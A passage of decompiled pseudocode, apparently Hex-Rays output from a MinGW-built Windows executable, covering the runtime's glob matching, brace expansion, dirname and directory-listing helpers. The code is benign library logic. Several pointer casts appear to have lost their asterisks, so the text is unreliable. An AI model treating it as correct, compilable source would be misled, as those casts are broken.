dword_404014 = -2;
LABEL_14:
__fpreset();
LABEL_8:
if ( (__cpu_features & 0x10) != 0 )
_mm_setcsr(Fe_stat_low);
return 0;
}
// 404014: using guessed type int dword_404014;
// 407024: using guessed type int __cpu_features;
//----- (00402460) --------------------------------------------------------
int __usercall sub_402460@<eax>(char *a1@<eax>, unsigned int a2@<edx>)
{
int v2; // ecx
char v3; // bl
int i; // edx
bool v5; // zf
if ( !a1 )
return 0;
v2 = 0;
v3 = ((a2 >> 5) ^ 1) & 1;
LABEL_3:
for ( i = *a1; *a1; v2 = v5 )
{
if ( v3 && i == 127 )
{
if ( !a1[1] )
return 0;
a1 += 2;
}
else
{
++a1;
}
if ( v2 )
{
if ( v2 <= 1 || i != 93 )
{
v2 += i != 33;
goto LABEL_3;
}
return 1;
}
if ( i == 42 || i == 63 )
return 1;
v5 = i == 91;
i = *a1;
}
return i;
}
//----- (00402500) --------------------------------------------------------
int __usercall sub_402500@<eax>(_DWORD *a1@<eax>)
{
int v2; // ebx
_DWORD *v3; // ecx
int result; // eax
int v5; // edx
if ( !a1 )
return 0;
v2 = a1[3] + 1;
v3 = malloc(4 * v2);
a1[2] = v3;
result = 3;
if ( v3 )
{
v5 = v2;
a1[1] = 0;
if ( v2 > 0 )
{
do
v3[--v5] = 0;
while ( v5 );
}
return 0;
}
return result;
}
//----- (00402570) --------------------------------------------------------
char *__usercall sub_402570@<eax>(char *a1@<eax>, int a2@<edx>, __int16 a3@<cx>)
{
char *v3; // edi
int v4; // ebx
int C; // ebp
char *v6; // esi
char v7; // dl
int v8; // esi
int v9; // eax
int v10; // eax
int v11; // ebp
int v12; // edi
char *i; // esi
char v14; // al
char v16; // al
int v17; // edi
int v18; // ebp
char v19; // al
char v22; // [esp+24h] [ebp-28h]
char *v23; // [esp+24h] [ebp-28h]
int v24; // [esp+28h] [ebp-24h]
int v25; // [esp+2Ch] [ebp-20h]
v3 = a1;
v4 = *a1;
C = v4;
if ( v4 != 93 && v4 != 45 )
goto LABEL_3;
if ( v4 == a2 )
{
v3 = a1 + 1;
while ( 1 )
{
v16 = *v3;
if ( *v3 == 93 )
return v3 + 1;
if ( v16 != 127 )
goto LABEL_45;
if ( (a3 & 0x20) != 0 )
{
++v3;
}
else
{
v16 = *++v3;
LABEL_45:
++v3;
if ( !v16 )
return 0;
}
}
}
v4 = a1[1];
v3 = a1 + 1;
LABEL_3:
v24 = ~a2;
v25 = 1 - a2;
while ( 1 )
{
v6 = v3 + 1;
if ( v4 == 93 )
return 0;
if ( v4 != 45 )
{
if ( !v4 )
return 0;
goto LABEL_9;
}
v7 = v3[1];
if ( v7 == 93 )
{
C = 45;
++v3;
goto LABEL_12;
}
v4 = v7;
if ( !v7 )
return 0;
v6 = v3 + 2;
if ( C < v7 )
break;
if ( C > v7 )
{
v23 = v3 + 2;
do
{
v17 = C - 1;
if ( (a3 & 0x4000) != 0 )
{
if ( !(v25 + v17) )
goto LABEL_58;
}
else
{
v18 = tolower(C);
if ( v18 == tolower(a2) )
{
LABEL_58:
i = v23;
while ( 1 )
{
v19 = *i;
if ( *i == 93 )
return i + 1;
if ( v19 != 127 )
goto LABEL_61;
if ( (a3 & 0x20) != 0 )
{
++i;
}
else
{
v19 = *++i;
LABEL_61:
++i;
if ( !v19 )
return 0;
}
}
}
}
C = v17;
}
while ( v4 != v17 );
LABEL_37:
v6 = v23;
}
LABEL_9:
if ( v4 == 47 || v4 == 92 )
return 0;
v7 = *v6;
C = v4;
v3 = v6;
LABEL_12:
if ( (a3 & 0x4000) != 0 )
{
if ( C == a2 )
goto LABEL_17;
}
else
{
v22 = v7;
v8 = tolower(C);
v9 = tolower(a2);
v7 = v22;
if ( v8 == v9 )
{
while ( 1 )
{
LABEL_17:
if ( v7 == 93 )
return v3 + 1;
if ( v7 == 127 )
{
if ( (a3 & 0x20) != 0 )
{
++v3;
goto LABEL_16;
}
v7 = *++v3;
}
++v3;
if ( !v7 )
return 0;
LABEL_16:
v7 = *v3;
}
}
}
v4 = v7;
}
v23 = v3 + 2;
v10 = C;
while ( 1 )
{
v11 = v10 + 1;
if ( (a3 & 0x4000) != 0 )
{
if ( !(v24 + v11) )
break;
goto LABEL_26;
}
v12 = tolower(v10);
if ( v12 == tolower(a2) )
break;
LABEL_26:
v10 = v11;
if ( v4 == v11 )
goto LABEL_37;
}
for ( i = v23; ; ++i )
{
v14 = *i;
if ( *i == 93 )
break;
while ( v14 == 127 )
{
if ( (a3 & 0x20) == 0 )
{
v14 = *++i;
break;
}
v14 = *++i;
if ( *i == 93 )
return i + 1;
}
if ( !v14 )
return 0;
}
return i + 1;
}
//----- (00402830) --------------------------------------------------------
int __usercall sub_402830@<eax>(char *a1@<eax>, _BYTE *a2@<edx>, unsigned int a3@<ecx>)
{
char *v3; // ebp
char v4; // cl
_BYTE *v5; // edi
int C; // edx
char *v7; // esi
char *v8; // eax
int v9; // ebx
int v10; // esi
int v11; // eax
int v12; // esi
int result; // eax
char v14; // dl
_BYTE *v15; // ebx
int v16; // edx
char *v17; // ebx
char v18; // al
int v20; // [esp+1Ch] [ebp-20h]
v3 = a1;
v4 = *a1;
if ( *a2 == 46 && v4 != 46 )
{
result = v4 - 46;
if ( (a3 & 0x10000) == 0 )
return result;
}
v5 = a2 + 1;
LABEL_3:
C = v4;
v7 = v5 - 1;
v8 = v3 + 1;
switch ( v4 )
{
case 0:
return -v7;
case 63:
if ( (v5 - 1) )
{
++v3;
goto LABEL_27;
}
return 63;
case 91:
v16 = (char)(v5 - 1);
if ( !(v5 - 1) )
return 91;
if ( v3[1] != 33 )
{
v3 = sub_402570(v8, v16, a3);
goto LABEL_26;
}
v17 = v3 + 2;
if ( sub_402570(v3 + 2, v16, a3) )
{
v3 += 2;
goto LABEL_26;
}
v18 = v3[2];
if ( v18 == 93 )
{
v17 = v3 + 3;
v18 = v3[3];
}
while ( 1 )
{
if ( v18 == 93 )
{
v3 = v17 + 1;
LABEL_26:
if ( !v3 )
return 93;
LABEL_27:
v4 = *v3;
++v5;
goto LABEL_3;
}
if ( v18 == 127 )
{
if ( (a3 & 0x20) != 0 )
{
++v17;
goto LABEL_43;
}
v18 = *++v17;
}
++v17;
if ( !v18 )
return 93;
LABEL_43:
v18 = *v17;
}
case 42:
v14 = v3[1];
v15 = v3 + 1;
if ( v14 == 42 )
{
do
v14 = *++v15;
while ( v15 == 42 );
}
result = 0;
if ( v14 )
{
do
{
result = sub_402830(a3 | 0x10000, v7);
if ( !result )
break;
++v7;
}
while ( (v7 - 1) );
}
break;
default:
if ( (((unsigned __int8)(a3 >> 5) ^ 1) & 1) == 0 || v4 != 127 || (C = v3[1], v3 += 2, !C) )
v3 = v8;
v9 = (char)(v5 - 1);
if ( (_BYTE)v9 )
{
if ( (a3 & 0x4000) != 0 )
{
v12 = C - v9;
}
else
{
v20 = C;
v10 = tolower(C);
v11 = tolower(v9);
C = v20;
v12 = v10 - v11;
}
if ( !v12 )
goto LABEL_27;
}
else
{
v9 = 0;
}
return C - v9;
}
return result;
}
//----- (00402A50) --------------------------------------------------------
int __usercall sub_402A50@<eax>(int a1@<eax>, int a2@<edx>)
{
_DWORD v4; // eax
int v5; // ecx
int v6; // edx
v4 = realloc((void **)(a2 + 8), 4 * ((_DWORD *)(a2 + 4) + *(_DWORD *)(a2 + 12)) + 8);
if ( !v4 )
return 1;
v5 = *(_DWORD *)(a2 + 4);
v6 = *(_DWORD *)(a2 + 12);
*(_DWORD *)(a2 + 8) = v4;
*(_DWORD *)(a2 + 4) = v5 + 1;
v4[v6 + v5] = a1;
v4[v5 + 1 + v6] = 0;
return 0;
}
//----- (00402AB0) --------------------------------------------------------
void __usercall sub_402AB0(_DWORD *a1@<eax>, int a2@<edx>, int a3@<ecx>)
{
int v5; // eax
if ( a1 )
((void ()(void))sub_402AB0)();
v5 = a1[2];
if ( v5 && a2 )
sub_402A50(v5, a2);
if ( a1[1] )
sub_402AB0(a3, a2);
free(a1);
}
// 402AD8: variable 'a3' is possibly undefined
//----- (00402B00) --------------------------------------------------------
int __usercall sub_402B00@<eax>(const char *a1@<eax>, unsigned int a2@<edx>, int a3@<ecx>, int a4)
{
char *v4; // ebx
size_t v5; // eax
size_t v6; // edx
int v7; // eax
void *v8; // esp
void *v9; // esp
char *v10; // eax
char *v11; // esi
unsigned int v12; // edi
unsigned int v13; // edx
char v14; // al
char *v15; // eax
char v16; // cl
char *v17; // edx
char v18; // al
char *v19; // edx
char j; // si
char *v21; // eax
HANDLE *v22; // edi
int v23; // esi
size_t v24; // edx
int v25; // eax
void *v26; // esp
void *v27; // esp
int v28; // eax
void *v29; // esp
void *v30; // esp
char *v31; // eax
char *v32; // esi
char v33; // dl
char v34; // dl
char *v35; // esi
_DWORD *v36; // ebx
unsigned int v37; // edi
int v38; // eax
_DWORD *v39; // edx
_DWORD *v40; // ecx
const char *v41; // eax
_DWORD *v42; // eax
int v43; // edx
int v45; // eax
void *v46; // esp
void *v47; // esp
char *v48; // esi
char *v49; // edi
char v50; // al
char *v51; // edi
_BYTE *v52; // edx
int v53; // ecx
char v54; // al
char v55; // al
bool v56; // bl
char *v57; // eax
int v58; // esi
char v59; // bl
_BYTE *v60; // ecx
char *v61; // ecx
char i; // al
unsigned int v63; // esi
int v64; // eax
int v65; // eax
void *v66; // esp
char *v67; // edx
void *v68; // esp
char *v69; // ecx
char v70; // al
char *v71; // eax
int v72; // ecx
void *v73; // edi
void **v74; // ebx
_DWORD *v75; // edi
void **v76; // eax
void *v77; // eax
char v78; // al
int (__cdecl *v79)(_DWORD, const char *); // edi
void **v80; // esi
int v81; // eax
void *v82; // esp
void *v83; // esp
char *v84; // edx
char v85; // al
char *v86; // eax
char v87; // bl
char *v88; // [esp+0h] [ebp-78h] BYREF
const char *v89; // [esp+4h] [ebp-74h]
char String[15]; // [esp+Ch] [ebp-6Ch] BYREF
char v92; // [esp+1Bh] [ebp-5Dh]
char *v93; // [esp+1Ch] [ebp-5Ch]
const char **v94; // [esp+20h] [ebp-58h]
size_t v95; // [esp+24h] [ebp-54h]
const char **v96; // [esp+28h] [ebp-50h]
size_t v97; // [esp+2Ch] [ebp-4Ch]
_DWORD *v98; // [esp+30h] [ebp-48h]
void *Block; // [esp+34h] [ebp-44h]
size_t Size; // [esp+38h] [ebp-40h]
int (__cdecl *v101)(_DWORD, const char *); // [esp+3Ch] [ebp-3Ch]
char *v102; // [esp+40h] [ebp-38h]
int v103; // [esp+44h] [ebp-34h]
unsigned int v104; // [esp+48h] [ebp-30h]
char *Str; // [esp+4Ch] [ebp-2Ch]
_DWORD v106[2]; // [esp+50h] [ebp-28h] BYREF
_DWORD *v107; // [esp+58h] [ebp-20h]
int v108; // [esp+5Ch] [ebp-1Ch]
v4 = (char *)a1;
v104 = a2;
v101 = (int (__cdecl *)(_DWORD, const char *))a3;
if ( (a2 & 0x400) != 0 )
{
Size = (size_t)&v88;
v45 = 16 * ((strlen(a1) + 16) >> 4);
v46 = alloca(v45);
v47 = alloca(v45);
v48 = v4;
v49 = String;
v102 = String;
v50 = *v4;
while ( 1 )
{
if ( v50 != 127 )
{
LABEL_54:
if ( v50 != 123 )
goto LABEL_55;
v103 = (int)v49;
v51 = v48;
while ( 1 )
{
v52 = (_BYTE *)v103;
v53 = 1;
LABEL_61:
v54 = v51[1];
if ( v54 != 127 )
{
LABEL_62:
++v51;
goto LABEL_63;
}
while ( 1 )
{
v55 = v51[2];
*v52 = 127;
v52[1] = v55;
if ( !v55 )
{
v52[2] = 0;
return 1;
}
v54 = v51[3];
v52 += 2;
v51 += 3;
LABEL_63:
if ( v54 != 125 && (v54 != 44 || v53 != 1) )
{
if ( v54 == 123 )
{
++v53;
v56 = 1;
LOBYTE(Str) = 1;
}
else
{
LOBYTE(Str) = v54 != 0;
v56 = v54 != 0;
}
*v52 = v54;
if ( v56 )
{
++v52;
goto LABEL_61;
}
if ( (_BYTE)Str )
{
++v52;
if ( v54 == 44 )
goto LABEL_79;
LABEL_96:
*v52 = 0;
return 1;
}
return 1;
}
if ( !--v53 )
break;
*v52 = v54;
v54 = v51[1];
++v52;
if ( v54 != 127 )
goto LABEL_62;
}
if ( v54 == 44 )
{
LABEL_79:
v57 = v51;
v58 = 1;
do
{
while ( 1 )
{
while ( 1 )
{
v59 = v57[1];
v60 = v57 + 1;
if ( v59 == 127 )
{
if ( !v57[2] )
goto LABEL_96;
while ( 1 )
{
v59 = v60[2];
v57 = v60 + 2;
if ( v59 != 127 )
break;
if ( !v60[3] )
goto LABEL_96;
v60 += 2;
}
}
else
{
++v57;
}
if ( v59 != 123 )
break;
++v58;
}
if ( v59 != 125 )
break;
if ( !--v58 )
goto LABEL_89;
}
}
while ( v59 );
goto LABEL_96;
}
v57 = v51;
LABEL_89:
v61 = v57 + 1;
for ( i = v57[1]; ; i = *v61 )
{
++v52;
++v61;
*(v52 - 1) = i;
if ( !i )
break;
}
v63 = v104 | 1;
v64 = sub_402B00(v101, v104, a4);
v104 = v63;
if ( v64 == 1 )
return 1;
if ( *v51 != 44 )
return v64;
}
}
while ( 1 )
{
v50 = v48[1];
*v49 = 127;
if ( v50 )
break;
++v49;
++v48;
LABEL_55:
*v49 = v50;
if ( !v50 )
goto LABEL_2;
v50 = v48[1];
++v49;
++v48;
if ( v50 != 127 )
goto LABEL_54;
}
v49[1] = v50;
v48 += 2;
v50 = *v48;
v49 += 2;
}
}
LABEL_2:
v94 = (const char **)&v88;
v5 = strlen(v4);
v6 = v5 + 1;
v7 = 16 * ((v5 + 16) >> 4);
v8 = alloca(v7);
v9 = alloca(v7);
v10 = (char *)memcpy(String, v4, v6);
Str = __mingw_dirname(v10);
v11 = Str;
v108 = 0;
v103 = sub_402500(v106);
if ( !v103 )
{
v12 = v104;
if ( sub_402460(v11, v104) )
{
v13 = v12;
BYTE1(v13) = BYTE1(v12) | 0x80;
v103 = sub_402B00(v101, v13, v106);
}
else
{
v65 = 16 * ((strlen(Str) + 16) >> 4);
v66 = alloca(v65);
v67 = Str;
v68 = alloca(v65);
v69 = String;
do
{
v70 = *v67;
if ( *v67 == 127 )
v70 = *++v67;
++v69;
++v67;
*(v69 - 1) = v70;
}
while ( v70 );
v71 = strdup(String);
if ( !v71 )
return 1;
v103 = sub_402A50((int)v71, (int)v106);
}
if ( !v103 )
{
v14 = v4[1];
if ( v14 == 47 || v14 == 92 || strcmp(Str, ""."") )
{
v15 = &v4[strlen(Str)];
if ( v4 >= v15 )
{
v87 = *v15;
v102 = v15;
v92 = v87;
}
else
{
v92 = *v15;
if ( v92 == 47 || v92 == 92 )
{
v102 = v15;
}
else
{
do
{
v17 = v15 - 1;
if ( v4 == v15 - 1 )
{
v18 = *(v15 - 1);
v102 = v17;
v92 = v18;
goto LABEL_17;
}
v16 = *--v15;
}
while ( v16 != 47 && v16 != 92 );
v102 = v17;
v92 = v16;
}
}
LABEL_17:
if ( v92 == 47 || v92 == 92 )
{
v19 = v102;
for ( j = v92; *++v19 == 92 || *v19 == 47; j = *v19 )
;
v102 = v19;
v92 = j;
v93 = Str;
}
else
{
v92 = 92;
v93 = Str;
}
}
else
{
if ( (v104 & 0x10) != 0 )
{
v103 = sub_402460(v4, v104);
if ( !v103 )
{
v81 = 16 * ((strlen(v4) + 16) >> 4);
v82 = alloca(v81);
v83 = alloca(v81);
v84 = String;
do
{
v85 = *v4;
if ( *v4 == 127 )
v85 = *++v4;
++v84;
++v4;
*(v84 - 1) = v85;
}
while ( v85 );
v86 = strdup(String);
if ( v86 && a4 )
{
sub_402A50((int)v86, a4);
Block = v107;
}
else
{
LABEL_131:
Block = v107;
}
goto LABEL_121;
}
}
v102 = v4;
v92 = 92;
v93 = 0;
}
v103 = 2;
Block = v107;
v21 = (char *)*v107;
Str = (char *)(v104 & 0x8000);
if ( !v21 )
goto LABEL_121;
LABEL_24:
v22 = (HANDLE )__mingw_opendir(v21);
if ( v22 )
{
if ( v93 )
Size = strlen((const char **)Block);
else
Size = 0;
v98 = 0;
v95 = Size + 2;
while ( 1 )
{
while ( 1 )
{
LABEL_28:
v23 = __mingw_readdir((int)v22);
if ( !v23 )
{
__mingw_closedir(v22);
if ( v98 )
sub_402AB0(v98, a4, v72);
LABEL_110:
v73 = Block;
v74 = (void **)((char )Block + 4);
free((void **)Block);
v21 = (char )((_DWORD *)v73 + 1);
if ( !v21 )
goto LABEL_131;
if ( v103 == 1 )
goto LABEL_118;
Block = v74;
goto LABEL_24;
}
if ( Str && *(_DWORD *)(v23 + 8) != 16 || sub_402830(v102, (_BYTE *)(v23 + 12), v104) )
continue;
v24 = *(unsigned __int16 *)(v23 + 6);
v96 = (const char **)&v88;
v25 = 16 * ((v24 + v95 + 15) >> 4);
v26 = alloca(v25);
v27 = alloca(v25);
v97 = 0;
if ( Size )
{
v97 = v24;
memcpy(String, *(const void **)Block, Size);
v24 = v97;
v78 = String[Size - 1];
if ( v78 == 47 || v78 == 92 )
{
v97 = Size;
}
else
{
v97 = Size + 1;
String[Size] = v92;
}
}
memcpy(&String[v97], (const void *)(v23 + 12), v24 + 1);
v28 = 16 * ((strlen(String) + 16) >> 4);
v29 = alloca(v28);
v30 = alloca(v28);
v31 = String;
v32 = String;
do
{
while ( 1 )
{
v33 = *v31;
if ( *v31 == 127 )
break;
++v32;
++v31;
*(v32 - 1) = v33;
if ( !v33 )
goto LABEL_37;
}
v34 = v31[1];
++v32;
v31 += 2;
*(v32 - 1) = v34;
}
while ( v34 );
LABEL_37:
v35 = strdup(String);
if ( !v35 )
{
v103 = 3;
continue;
}
v103 = v103 == 2 ? 0 : v103;
if ( (v104 & 0x40) != 0 )
{
if ( a4 )
sub_402A50((int)v35, a4);
continue;
}
v36 = v98;
if ( v98 )
break;
v42 = malloc(0xCu);
if ( v42 )
{
v42[2] = v35;
v42[1] = 0;
*v42 = 0;
goto LABEL_130;
}
}
v97 = (size_t)v22;
v37 = v104 & 0x4000;
while ( 1 )
{
v41 = (const char *)v36[2];
v88 = v35;
v89 = v41;
if ( !v37 )
break;
v38 = strcoll(v88, v89);
v39 = (_DWORD *)*v36;
v40 = (_DWORD *)v36[1];
if ( v38 <= 0 )
goto LABEL_46;
LABEL_42:
if ( !v40 )
goto LABEL_47;
LABEL_43:
v36 = v40;
}
v38 = stricoll(v88, v89);
v39 = (_DWORD *)*v36;
v40 = (_DWORD *)v36[1];
if ( v38 > 0 )
goto LABEL_42;
LABEL_46:
v40 = v39;
if ( v39 )
goto LABEL_43;
LABEL_47:
v22 = (HANDLE *)v97;
v97 = v38;
v42 = malloc(0xCu);
if ( v42 )
{
v43 = v97;
v42[2] = v35;
v42[1] = 0;
*v42 = 0;
if ( v43 > 0 )
{
v36[1] = v42;
goto LABEL_28;
}
*v36 = v42;
if ( !v98 )
LABEL_130:
v98 = v42;
}
}
}
if ( (v104 & 4) != 0 )
{
v75 = Block;
v74 = (void **)((char )Block + 4);
v76 = (void **)Block;
}
else
{
v79 = v101;
if ( !v101 )
goto LABEL_110;
v89 = (const char )_errno();
v80 = (void **)Block;
if ( !v79((_DWORD *)Block, v89) )
goto LABEL_110;
v76 = v80;
v74 = v80 + 1;
v75 = v80;
}
free(*v76);
if ( v75[1] )
{
LABEL_118:
v77 = (void )((_DWORD *)Block + 1);
do
{
++v74;
free(v77);
v77 = *v74;
}
while ( *v74 );
}
v103 = 1;
Block = v107;
LABEL_121:
free(Block);
}
}
return v103;
}
// 402EB3: conditional instruction was optimized away because al.1 is in (1..7A|7C..7E|<0)
// 40336F: conditional instruction was optimized away because al.1==0
// 403108: variable 'v72' is possibly undefined
// 402B00: using guessed type _DWORD var_28[2];
// 402B00: using guessed type char String[15];
//----- (00403390) --------------------------------------------------------
int *__cdecl __mingw_glob(char *Str, int a2, int a3, char **a4)
{
char *v4; // ebx
int v5; // ecx
int v7; // eax
void *v8; // esp
void *v9; // esp
char *v10; // edx
char v11; // al
char v12; // al
char *v13; // eax
int v14; // [esp+0h] [ebp-38h] BYREF
char String[20]; // [esp+4h] [ebp-34h] BYREF
int v16; // [esp+18h] [ebp-20h]
int *v17; // [esp+1Ch] [ebp-1Ch]
v4 = Str;
if ( a4 && (a2 & 2) == 0 )
a4[3] = 0;
if ( *a4 != ""glob-1.0-mingw32"" )
{
sub_402500(a4);
*a4 = ""glob-1.0-mingw32"";
}
v5 = sub_402B00(Str, a2, a3, (int)a4);
if ( v5 == 2 && (a2 & 0x10) != 0 )
{
v16 = 2;
v17 = &v14;
v7 = 16 * ((strlen(Str) + 16) >> 4);
v8 = alloca(v7);
v9 = alloca(v7);
v10 = String;
do
{
while ( 1 )
{
v11 = *v4;
if ( *v4 == 127 )
break;
++v10;
++v4;
*(v10 - 1) = v11;
if ( !v11 )
goto LABEL_13;
}
v12 = v4[1];
++v10;
v4 += 2;
*(v10 - 1) = v12;
}
while ( v12 );
LABEL_13:
v16 = 2;
v13 = strdup(String);
v5 = v16;
if ( v13 )
{
v17 = (int *)v16;
sub_402A50((int)v13, (int)a4);
return v17;
}
}
return (int *)v5;
}
//----- (00403480) --------------------------------------------------------
void __cdecl __mingw_globfree(void *a1)
{
int v1; // eax
int v2; // edi
int v3; // ebx
void *Block; // eax
if ( *(char **)a1 == ""glob-1.0-mingw32"" )
{
v1 = *((_DWORD *)a1 + 1);
v2 = v1 - 1;
v3 = 4 * *((_DWORD *)a1 + 3);
if ( v1 > 0 )
{
do
{
--v2;
Block = (void **)(((_DWORD )a1 + 2) + v3);
v3 += 4;
free(Block);
}
while ( v2 != -1 );
}
free(((void **)a1 + 2));
}
}
//----- (004034E0) --------------------------------------------------------
char *__cdecl __mingw_dirname(char *Source)
{
char *v1; // eax
char *v2; // ebx
size_t v3; // esi
size_t v5; // edx
int v6; // eax
void *v7; // esp
void *v8; // esp
bool v9; // cc
_WORD *v10; // ecx
wchar_t v11; // dx
_WORD *v12; // esi
__int16 v13; // dx
_WORD *i; // eax
size_t v15; // eax
_WORD *v16; // eax
char *v17; // esi
_WORD *v18; // eax
__int16 v19; // dx
wchar_t *p_Dest; // ecx
wchar_t v21; // dx
wchar_t *v22; // eax
size_t v23; // eax
size_t v24; // eax
__int16 v25; // dx
int v26; // [esp+0h] [ebp-38h] BYREF
wchar_t Dest; // [esp+Ch] [ebp-2Ch] BYREF
__int16 v28; // [esp+Eh] [ebp-2Ah]
size_t v29[2]; // [esp+10h] [ebp-28h] BYREF
wchar_t v30; // [esp+1Ah] [ebp-1Eh]
size_t MaxCount; // [esp+1Ch] [ebp-1Ch]
v1 = setlocale(2, 0);
v2 = v1;
if ( v1 )
v2 = strdup(v1);
setlocale(2, Locale);
if ( !Source || !*Source )
goto LABEL_5;
v29[1] = (size_t)&v26;
v5 = mbstowcs(0, Source, 0);
v6 = 16 * ((2 * v5 + 18) >> 4);
v7 = alloca(v6);
v8 = alloca(v6);
v29[0] = mbstowcs(&Dest, Source, v5);
v9 = v29[0] <= 1;
*(&Dest + v29[0]) = 0;
MaxCount = (size_t)&Dest;
v30 = Dest;
if ( !v9 )
{
if ( Dest == 47 || Dest == 92 )
{
if ( v30 == v28 && !LOWORD(v29[0]) )
{
setlocale(2, v2);
free(v2);
return Source;
}
}
else if ( v28 == 58 )
{
MaxCount = (size_t)v29;
v30 = v29[0];
}
}
if ( !v30 )
{
LABEL_5:
v3 = wcstombs(0, L""."", 0) + 1;
Block = realloc(Block, v3);
wcstombs((char *)Block, L""."", v3);
setlocale(2, v2);
free(v2);
return (char *)Block;
}
v10 = (_WORD *)MaxCount;
v11 = v30;
v12 = (_WORD *)MaxCount;
do
{
while ( v11 != 47 && v11 != 92 )
{
v11 = v10[1];
++v10;
if ( !v11 )
goto LABEL_21;
}
v13 = *v10;
for ( i = v10; *i == 47; v13 = *i )
LABEL_17:
++i;
if ( v13 == 92 )
goto LABEL_17;
if ( !v13 )
break;
v11 = i[1];
v12 = i;
v10 = i + 1;
}
while ( v11 );
LABEL_21:
if ( MaxCount < (unsigned int)v12 )
{
while ( 1 )
{
v18 = v12 - 1;
if ( MaxCount >= (unsigned int)(v12 - 1) )
break;
v19 = *--v12;
if ( v19 != 47 && v19 != 92 )
goto LABEL_30;
}
if ( (_WORD *)MaxCount == v12 - 1 && (v30 == 47 || v30 == 92) && *v12 == v30 )
{
v25 = v18[2];
if ( v25 != 47 && v25 != 92 )
v18 = v12;
}
LABEL_30:
p_Dest = &Dest;
v18[1] = 0;
v21 = Dest;
if ( Dest == 47 || Dest == 92 )
{
do
{
do
++p_Dest;
while ( *p_Dest == 47 );
}
while ( *p_Dest == 92 );
if ( (char *)p_Dest - (char *)&Dest > 5 )
goto LABEL_35;
}
if ( v28 != Dest )
LABEL_35:
p_Dest = &Dest;
else
v21 = *p_Dest;
v22 = p_Dest;
while ( v21 )
{
while ( 1 )
{
*p_Dest++ = v21;
if ( v21 == 47 )
break;
if ( *v22 == 92 )
{
++v22;
break;
}
v21 = v22[1];
++v22;
if ( !v21 )
goto LABEL_41;
}
v21 = *v22;
if ( *v22 == 92 || v21 == 47 )
{
do
{
do
v21 = *++v22;
while ( *v22 == 47 );
}
while ( v21 == 92 );
}
}
LABEL_41:
v23 = v29[0];
*p_Dest = 0;
v24 = wcstombs(Source, &Dest, v23);
v17 = Source;
if ( v24 != -1 )
Source[v24] = 0;
}
else
{
if ( v30 == 47 || v30 == 92 )
{
v16 = (_WORD *)(MaxCount + 2);
}
else
{
v15 = MaxCount;
*(_WORD *)MaxCount = 46;
v16 = (_WORD *)(v15 + 2);
}
*v16 = 0;
MaxCount = wcstombs(0, &Dest, 0) + 1;
Block = realloc(Block, MaxCount);
v17 = (char *)Block;
wcstombs((char *)Block, &Dest, MaxCount);
}
setlocale(2, v2);
free(v2);
return v17;
}
//----- (004038E0) --------------------------------------------------------
HANDLE __usercall sub_4038E0@<eax>(const CHAR *lpFileName@<eax>, int a2@<edx>)
{
HANDLE FirstFileA; // esi
CHAR *v4; // ecx
unsigned __int16 i; // ax
CHAR v6; // al
DWORD dwFileAttributes; // eax
int *v9; // ebx
DWORD LastError; // eax
struct _WIN32_FIND_DATAA FindFileData; // [esp+10h] [ebp-14Ch] BYREF
FirstFileA = FindFirstFileA(lpFileName, &FindFileData);
if ( FirstFileA == (HANDLE)-1 )
{
v9 = _errno();
LastError = GetLastError();
*v9 = LastError;
if ( LastError == 3 )
{
*_errno() = 2;
}
else if ( *_errno() == 267 )
{
*_errno() = 20;
}
else if ( *_errno() != 2 )
{
*_errno() = 22;
}
return FirstFileA;
}
v4 = (CHAR *)(a2 + 12);
*(_WORD *)(a2 + 6) = 0;
for ( i = 0; ; v4 += i < 0x104u )
{
v6 = FindFileData.cFileName[i];
*v4 = v6;
if ( !v6 )
break;
i = *(_WORD *)(a2 + 6) + 1;
*(_WORD *)(a2 + 6) = i;
}
dwFileAttributes = FindFileData.dwFileAttributes;
LOBYTE(dwFileAttributes) = FindFileData.dwFileAttributes & 0x58;
if ( dwFileAttributes > 0x10 )
{
*(_DWORD *)(a2 + 8) = 24;
return FirstFileA;
}
*(_DWORD *)(a2 + 8) = dwFileAttributes;
return FirstFileA;
}
//----- (004039B0) --------------------------------------------------------
BOOL __usercall sub_4039B0@<eax>(void *hFindFile@<eax>, int a2@<edx>)
{
BOOL NextFileA; // esi
CHAR *v4; // ecx
unsigned __int16 i; // ax
CHAR v6; // al
DWORD dwFileAttributes; // eax
struct _WIN32_FIND_DATAA FindFileData; // [esp+10h] [ebp-14Ch] BYREF
NextFileA = FindNextFileA(hFindFile, &FindFileData);
if ( NextFileA )
{
v4 = (CHAR *)(a2 + 12);
*(_WORD *)(a2 + 6) = 0;
for ( i = 0; ; v4 += i < 0x104u )
{
v6 = FindFileData.cFileName[i];
*v4 = v6;
if ( !v6 )
break;
i = *(_WORD *)(a2 + 6) + 1;
*(_WORD *)(a2 + 6) = i;
}
dwFileAttributes = FindFileData.dwFileAttributes;
LOBYTE(dwFileAttributes) = FindFileData.dwFileAttributes & 0x58;
if ( dwFileAttributes <= 0x10 )
{
*(_DWORD *)(a2 + 8) = dwFileAttributes;
return NextFileA;
}
*(_DWORD *)(a2 + 8) = 24;
return NextFileA;
}
else
{
if ( GetLastError() == 18 )
return NextFileA;
*_errno() = 2;
return 0;
}
}
//----- (00403A60) --------------------------------------------------------
int __cdecl __mingw_opendir(char *Path)
{
char *v1; // eax
int v2; // ecx
unsigned int v3; // edx
int v4; // eax
char v5; // dl
int v6; // ecx
unsigned int v7; // edx
char *v8; // kr00_4
char *v9; // eax
int v10; // esi
const CHAR *v11; // ebp
HANDLE v12; // eax
char *Buffer; // [esp+0h] [ebp-13Ch]
char Src[288]; // [esp+1Ch] [ebp-120h] BYREF
if ( Path )
{
if ( *Path )
{
_fullpath(Src, Path, 0x104u);
v1 = Src;
if ( Src[0] )
{
do
{
v2 = *(_DWORD *)v1;
v1 += 4;
v3 = ~v2 & (v2 - 16843009) & 0x80808080;
}
while ( !v3 );
if ( (~v2 & (v2 - 16843009) & 0x8080) == 0 )
{
v3 >>= 16;
v1 += 2;
}
v4 = &v1[-CFADD((_BYTE)v3, (_BYTE)v3) - 3] - Src;
v5 = Src[v4 - 1];
if ( v5 != 47 && v5 != 92 )
*(_WORD *)&Src[v4++] = 92;
}
else
{
do
{
v6 = *(_DWORD *)v1;
v1 += 4;
v7 = ~v6 & (v6 - 16843009) & 0x80808080;
}
while ( !v7 );
if ( (~v6 & (v6 - 16843009) & 0x8080) == 0 )
{
v7 >>= 16;
v1 += 2;
}
v4 = &v1[-CFADD((_BYTE)v7, (_BYTE)v7) - 3] - Src;
}
*(_WORD *)&Src[v4] = 42;
v8 = &Src[strlen(Src)];
v9 = (char *)malloc(v8 - Src + 284);
v10 = (int)v9;
if ( v9 )
{
v11 = v9 + 280;
